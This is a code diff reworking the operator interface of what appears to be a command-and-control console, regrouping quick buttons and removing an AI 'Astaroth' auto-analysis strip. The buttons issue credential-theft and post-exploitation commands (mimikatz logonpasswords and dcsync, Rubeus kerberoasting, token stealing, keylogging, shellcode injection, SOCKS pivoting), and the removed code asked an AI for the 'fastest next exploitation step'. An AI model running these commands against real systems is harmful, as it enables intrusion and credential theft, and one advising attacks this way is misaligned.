@@ -834,39 +834,37 @@ html,body { height:100%; background:var(--bg); color:var(--text); font:12px/1.5 
 /* ── shell tab ── */
 #tab-shell { flex:1; overflow:hidden; display:flex; flex-direction:column; }
 .quick-bar {
-  padding:6px 12px; background:var(--surf2); border-bottom:1px solid var(--border);
-  display:flex; gap:4px; flex-wrap:wrap; align-items:center; flex-shrink:0;
+  padding:0; background:var(--surf2); border-bottom:1px solid var(--border);
+  display:flex; flex-direction:column; flex-shrink:0;
 }
+.qbar-row {
+  display:flex; align-items:center; gap:0; min-height:28px;
+  border-bottom:1px solid var(--border);
+}
+.qbar-row:last-child { border-bottom:none; }
 .qlabel {
-  font-size:9px; color:var(--red2); letter-spacing:.1em; font-weight:600;
-  padding:1px 6px 1px 4px; border-left:2px solid var(--red);
-  background:var(--red4); border-radius:0 2px 2px 0;
-  margin-right:3px; margin-left:6px; align-self:center; flex-shrink:0;
+  font-size:9px; color:var(--dim2); letter-spacing:.1em; font-weight:600;
+  padding:0 10px; height:100%; display:flex; align-items:center;
+  border-right:1px solid var(--border); cursor:pointer; flex-shrink:0;
+  min-width:68px; justify-content:space-between; gap:4px;
+  user-select:none; transition:background .1s, color .1s;
 }
-.qlabel:first-child { margin-left:0; }
+.qlabel:hover { background:var(--surf3); color:var(--text); }
+.qlabel.open { color:var(--red2); background:var(--red4); border-right-color:var(--red); }
+.qlabel .qarrow { font-size:7px; color:var(--dim); transition:transform .15s; }
+.qlabel.open .qarrow { transform:rotate(90deg); color:var(--red2); }
+.qgroup {
+  display:none; gap:3px; padding:0 8px; align-items:center; flex-wrap:wrap; flex:1;
+}
+.qgroup.open { display:flex; }
 .qbtn {
   padding:2px 7px; font-size:10px; border:1px solid var(--bord2); border-radius:2px;
   background:var(--surf3); color:var(--dim2); cursor:pointer; font-family:var(--mono);
-  transition:all .1s;
+  transition:border-color .1s, color .1s; white-space:nowrap;
 }
 .qbtn:hover { border-color:var(--red); color:var(--red2); }
 /* ── Astaroth inline strip ── */
-#ast-strip {
-  display:none; padding:5px 12px; background:var(--red4);
-  border-bottom:1px solid var(--red3); flex-shrink:0;
-  align-items:center; gap:8px; cursor:pointer; min-height:28px;
-}
-#ast-strip.has-content { display:flex; }
-#ast-strip:hover { background:var(--red3); }
-#ast-strip-chip { font-size:9px; color:var(--red2); letter-spacing:.1em; font-weight:700; flex-shrink:0; }
-#ast-strip-text { font-size:10px; color:var(--dim2); flex:1; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
-#ast-strip-analyze {
-  font-size:9px; color:var(--dim); padding:2px 6px;
-  border:1px solid var(--bord2); border-radius:2px;
-  background:var(--surf2); cursor:pointer; flex-shrink:0; font-family:var(--mono);
-}
-#ast-strip-analyze:hover { border-color:var(--red); color:var(--red2); }
-#ast-strip-analyze.spinning { color:var(--amber); border-color:var(--amber); }
+/* ast-strip removed — Astaroth is manual-only */
 /* ── shell output ── */
 #shell-out {
   flex:1; overflow-y:auto; padding:10px 14px;
@@ -1223,66 +1221,74 @@ input[type=text]:focus { outline:none; border-color:var(--red); }
           <!-- Shell tab -->
           <div id="tab-shell">
             <div class="quick-bar">
-              <span class="qlabel">HOST▸</span>
-              <button class="qbtn" onclick="qi('whoami /all')">whoami /all</button>
-              <button class="qbtn" onclick="qi('hostname')">hostname</button>
-              <button class="qbtn" onclick="qi('ipconfig /all')">ipconfig</button>
-              <button class="qbtn" onclick="qi('systeminfo')">sysinfo</button>
-              <button class="qbtn" onclick="qi('ps')">ps</button>
-              <button class="qbtn" onclick="qi('netstat -ano')">netstat</button>
-              <button class="qbtn" onclick="qi('net share')">shares</button>
-              <button class="qbtn" onclick="qi('arp -a')">arp</button>
-              <button class="qbtn" onclick="qi('env')">env</button>
-              <button class="qbtn" onclick="qi('migrate')">migrate</button>
-              <button class="qbtn" onclick="qi('screenshot')">screenshot</button>
-              <button class="qbtn" onclick="qi('clip')">clip</button>
-              <span class="qlabel" style="margin-left:8px">AD▸</span>
-              <button class="qbtn" onclick="qi('net user /domain')">users</button>
-              <button class="qbtn" onclick="qi('net group \"Domain Admins\" /domain')">DA</button>
-              <button class="qbtn" onclick="qi('net group \"Enterprise Admins\" /domain')">EA</button>
-              <button class="qbtn" onclick="qi('nltest /domain_trusts /all_trusts')">trusts</button>
-              <button class="qbtn" onclick="qi('nltest /dclist:')">DCs</button>
-              <button class="qbtn" onclick="qi('wmic os get Caption,Version,BuildNumber /format:list')">os</button>
-              <span class="qlabel" style="margin-left:8px">KERBEROS▸</span>
-              <button class="qbtn" onclick="qi('Rubeus triage')">triage</button>
-              <button class="qbtn" onclick="qi('Rubeus kerberoast /outfile:hashes.txt /nowrap')">kerberoast</button>
-              <button class="qbtn" onclick="qi('Rubeus asreproast /format:hashcat /nowrap')">asreproast</button>
-              <button class="qbtn" onclick="qi('Certify find /vulnerable')">ADCS</button>
-              <button class="qbtn" onclick="qi('Whisker list')">shadow creds</button>
-              <button class="qbtn" onclick="qi('SharpView Get-DomainUser -SPN')">SPNs</button>
-              <button class="qbtn" onclick="qi('SharpView Get-ObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match \"GenericAll|WriteDacl|WriteOwner\"}')">ACLs</button>
-              <button class="qbtn" onclick="qi('SharpLAPS /host:')">LAPS</button>
-              <button class="qbtn" onclick="qi('mimikatz sekurlsa::logonpasswords exit')">sekurlsa</button>
-              <button class="qbtn" onclick="qi('mimikatz lsadump::dcsync /user:krbtgt exit')">dcsync</button>
-              <button class="qbtn" onclick="qi('sleep 5000')">sleep 5s</button>
-              <button class="qbtn" onclick="qi('sleep 30000')">sleep 30s</button>
-              <button class="qbtn" onclick="qi('keylog start')">klog▸start</button>
-              <button class="qbtn" onclick="qi('keylog dump')">klog▸dump</button>
-              <button class="qbtn" onclick="qi('keylog stop')">klog▸stop</button>
-              <span class="qlabel" style="margin-left:8px">TOKEN▸</span>
-              <button class="qbtn" onclick="qi('getuid')">getuid</button>
-              <button class="qbtn" onclick="qi('steal_token ')">steal_token</button>
-              <button class="qbtn" onclick="qi('make_token ')">make_token</button>
-              <button class="qbtn" onclick="qi('rev2self')">rev2self</button>
-              <span class="qlabel" style="margin-left:8px">FS▸</span>
-              <button class="qbtn" onclick="qi('pwd')">pwd</button>
-              <button class="qbtn" onclick="qi('ls ')">ls</button>
-              <button class="qbtn" onclick="qi('cd ')">cd</button>
-              <button class="qbtn" onclick="qi('download ')">download</button>
-              <span class="qlabel" style="margin-left:8px">EXEC▸</span>
-              <button class="qbtn" onclick="qi('execasm ')">execasm</button>
-              <button class="qbtn" onclick="qi('shellcode ')">shellcode</button>
-              <button class="qbtn" onclick="qi('inject ')">inject</button>
-              <button class="qbtn" onclick="qi('portscan ')">portscan</button>
-              <span class="qlabel" style="margin-left:8px">SOCKS5▸</span>
-              <button class="qbtn" onclick="socks5Start()" title="Start SOCKS5 proxy on port 1080 for active session">socks5▸start</button>
-              <button class="qbtn" onclick="socks5Stop()" title="Stop SOCKS5 proxy for active session">socks5▸stop</button>
-              <button class="qbtn" onclick="socks5Status()" title="Show active SOCKS5 proxies">socks5▸status</button>
-            </div>
-            <div id="ast-strip" onclick="toggleAstaroth()">
-              <span id="ast-strip-chip">⟁ ASTAROTH</span>
-              <span id="ast-strip-text"></span>
-              <button id="ast-strip-analyze" onclick="event.stopPropagation();astAutoAnalyze()">auto-analyze</button>
+              <div class="qbar-row">
+                <span class="qlabel open" onclick="qToggle(this,'qg-host')">HOST <span class="qarrow">▶</span></span>
+                <div class="qgroup open" id="qg-host">
+                  <button class="qbtn" onclick="qi('whoami /all')">whoami</button>
+                  <button class="qbtn" onclick="qi('hostname')">hostname</button>
+                  <button class="qbtn" onclick="qi('ipconfig /all')">ipconfig</button>
+                  <button class="qbtn" onclick="qi('systeminfo')">sysinfo</button>
+                  <button class="qbtn" onclick="qi('ps')">ps</button>
+                  <button class="qbtn" onclick="qi('netstat -ano')">netstat</button>
+                  <button class="qbtn" onclick="qi('net share')">shares</button>
+                  <button class="qbtn" onclick="qi('arp -a')">arp</button>
+                  <button class="qbtn" onclick="qi('env')">env</button>
+                  <button class="qbtn" onclick="qi('screenshot')">screenshot</button>
+                  <button class="qbtn" onclick="qi('clip')">clip</button>
+                  <button class="qbtn" onclick="qi('migrate')">migrate</button>
+                  <button class="qbtn" onclick="qi('sleep 5000')">sleep 5s</button>
+                  <button class="qbtn" onclick="qi('sleep 30000')">sleep 30s</button>
+                </div>
+              </div>
+              <div class="qbar-row">
+                <span class="qlabel" onclick="qToggle(this,'qg-ad')">AD <span class="qarrow">▶</span></span>
+                <div class="qgroup" id="qg-ad">
+                  <button class="qbtn" onclick="qi('net user /domain')">users</button>
+                  <button class="qbtn" onclick="qi('net group \"Domain Admins\" /domain')">DA</button>
+                  <button class="qbtn" onclick="qi('net group \"Enterprise Admins\" /domain')">EA</button>
+                  <button class="qbtn" onclick="qi('nltest /domain_trusts /all_trusts')">trusts</button>
+                  <button class="qbtn" onclick="qi('nltest /dclist:')">DCs</button>
+                  <button class="qbtn" onclick="qi('wmic os get Caption,Version,BuildNumber /format:list')">os info</button>
+                </div>
+              </div>
+              <div class="qbar-row">
+                <span class="qlabel" onclick="qToggle(this,'qg-kerb')">KERBEROS <span class="qarrow">▶</span></span>
+                <div class="qgroup" id="qg-kerb">
+                  <button class="qbtn" onclick="qi('Rubeus triage')">triage</button>
+                  <button class="qbtn" onclick="qi('Rubeus kerberoast /outfile:hashes.txt /nowrap')">kerberoast</button>
+                  <button class="qbtn" onclick="qi('Rubeus asreproast /format:hashcat /nowrap')">asreproast</button>
+                  <button class="qbtn" onclick="qi('Certify find /vulnerable')">ADCS</button>
+                  <button class="qbtn" onclick="qi('Whisker list')">shadow creds</button>
+                  <button class="qbtn" onclick="qi('SharpView Get-DomainUser -SPN')">SPNs</button>
+                  <button class="qbtn" onclick="qi('SharpView Get-ObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match \"GenericAll|WriteDacl|WriteOwner\"}')">ACLs</button>
+                  <button class="qbtn" onclick="qi('SharpLAPS /host:')">LAPS</button>
+                  <button class="qbtn" onclick="qi('mimikatz sekurlsa::logonpasswords exit')">sekurlsa</button>
+                  <button class="qbtn" onclick="qi('mimikatz lsadump::dcsync /user:krbtgt exit')">dcsync</button>
+                </div>
+              </div>
+              <div class="qbar-row">
+                <span class="qlabel" onclick="qToggle(this,'qg-post')">POST-EX <span class="qarrow">▶</span></span>
+                <div class="qgroup" id="qg-post">
+                  <button class="qbtn" onclick="qi('getuid')">getuid</button>
+                  <button class="qbtn" onclick="qi('steal_token ')">steal_token</button>
+                  <button class="qbtn" onclick="qi('make_token ')">make_token</button>
+                  <button class="qbtn" onclick="qi('rev2self')">rev2self</button>
+                  <button class="qbtn" onclick="qi('keylog start')">klog start</button>
+                  <button class="qbtn" onclick="qi('keylog dump')">klog dump</button>
+                  <button class="qbtn" onclick="qi('keylog stop')">klog stop</button>
+                  <button class="qbtn" onclick="qi('pwd')">pwd</button>
+                  <button class="qbtn" onclick="qi('ls ')">ls</button>
+                  <button class="qbtn" onclick="qi('cd ')">cd</button>
+                  <button class="qbtn" onclick="qi('download ')">download</button>
+                  <button class="qbtn" onclick="qi('execasm ')">execasm</button>
+                  <button class="qbtn" onclick="qi('shellcode ')">shellcode</button>
+                  <button class="qbtn" onclick="qi('inject ')">inject</button>
+                  <button class="qbtn" onclick="qi('portscan ')">portscan</button>
+                  <button class="qbtn" onclick="socks5Start()">socks5 start</button>
+                  <button class="qbtn" onclick="socks5Stop()">socks5 stop</button>
+                  <button class="qbtn" onclick="socks5Status()">socks5 status</button>
+                </div>
+              </div>
             </div>
             <div id="shell-out"></div>
             <div id="shell-input-bar">
@@ -1579,20 +1585,9 @@ function handleSSE(ev) {
       break;
     case 'file_served':
       break;
-    case 'ast_auto_start': {
-      const panel = document.getElementById('astaroth-panel');
-      if (!astOpen) {
-        astOpen = true;
-        panel.classList.add('open');
-        document.getElementById('ast-toggle')?.classList.add('active');
-        updateAstCtx();
-      }
-      astAppend('sys', `⚡ auto [${(ev.task_id||'').slice(0,8)}]`);
-      const autoBubble = astAppend('ai', '');
-      autoBubble.classList.add('ast-streaming');
-      astPending[ev.stream_id] = autoBubble;
+    case 'ast_auto_start':
+      // auto-analysis disabled — Astaroth is manual-only
       break;
-    }
     case 'ast_token': {
       if (astStripStreams.has(ev.id)) {
         astStripBuf += ev.token;
@@ -2588,43 +2583,17 @@ function astAppend(type, text) {
   return d;
 }
 
-// ── Astaroth inline strip ──────────────────────────────────────────────────
-let astStripStreams = new Set();  // stream_ids that feed the strip, not the panel
+// ── Astaroth strip stubs (strip removed, keep noop so deselectSession doesn't crash) ──
+let astStripStreams = new Set();
 let astStripBuf    = '';
+function updateAstStrip() {}
 
-function updateAstStrip(text) {
-  const strip = document.getElementById('ast-strip');
-  const txt   = document.getElementById('ast-strip-text');
-  if (!strip || !txt) return;
-  if (text === null) { strip.classList.remove('has-content'); return; }
-  txt.textContent = text;
-  strip.classList.add('has-content');
-}
-
-async function astAutoAnalyze() {
-  if (!selectedSid) return;
-  const btn = document.getElementById('ast-strip-analyze');
-  btn.textContent = '…';
-  btn.classList.add('spinning');
-  astStripBuf = '';
-  updateAstStrip('analyzing…');
-  try {
-    const r = await fetch('/ui/api/astaroth/consult', {
-      method: 'POST',
-      headers: {'Content-Type':'application/json'},
-      body: JSON.stringify({
-        question: 'Fastest next exploitation step based on current session? One sentence, lead with the tool name.',
-        session_id: selectedSid || '',
-      }),
-    });
-    if (!r.ok) { updateAstStrip('[error ' + r.status + ']'); btn.textContent='auto-analyze'; btn.classList.remove('spinning'); return; }
-    const {stream_id} = await r.json();
-    astStripStreams.add(stream_id);
-  } catch(e) {
-    updateAstStrip('[' + e.message + ']');
-    btn.textContent = 'auto-analyze';
-    btn.classList.remove('spinning');
-  }
+// ── quickbar accordion ─────────────────────────────────────────────────────
+function qToggle(lbl, groupId) {
+  const grp = document.getElementById(groupId);
+  if (!grp) return;
+  const open = grp.classList.toggle('open');
+  lbl.classList.toggle('open', open);
 }
 
 // ── Admin ──────────────────────────────────────────────────────────────────
